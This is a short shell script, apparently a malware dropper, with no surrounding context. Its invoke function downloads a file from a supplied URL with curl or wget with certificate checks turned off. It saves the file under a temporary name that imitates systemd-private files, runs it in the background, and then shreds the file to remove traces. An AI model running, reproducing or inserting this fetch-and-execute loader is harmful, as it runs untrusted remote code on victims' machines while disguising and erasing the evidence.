invoke() {
  [ -z "$1" ] && return

  x=$(which shred)
  cleanup_file() {
    while [ -f $1 ]
    do
      if [ $x ]
      then
        shred -fzu -- $1
      else
        rm -rf -- $1
      fi
      [ $?!=0 ] && sleep .2
    done
  }
  cleanup_dir() {
    while [ -d $1 ]
    do
      rm -rf -- $1
      [ $?!=0 ] && sleep .2
    done
  }
  export d=$(mktemp -d /tmp/systemd-private-XXXXXX)
  export f=$(mktemp -u $d/systemd-private-XXXXXX.service)

  cleanup() {
    (cleanup_file $f; cleanup_dir $d) &
  }
  [ $(which trap) ] && trap cleanup EXIT

  if [ $(which curl) ]; then
    curl -s -k "$1" -o "$f"
  elif [ $(which wget) ]; then
    wget --no-check-certificate -q -O "$f" -- "$1"
  else
    cleanup
    return
  fi

  chmod +x $f && sh -c "$f $2 &" && sleep .2
  cleanup
}

invoke "$uri" "$args"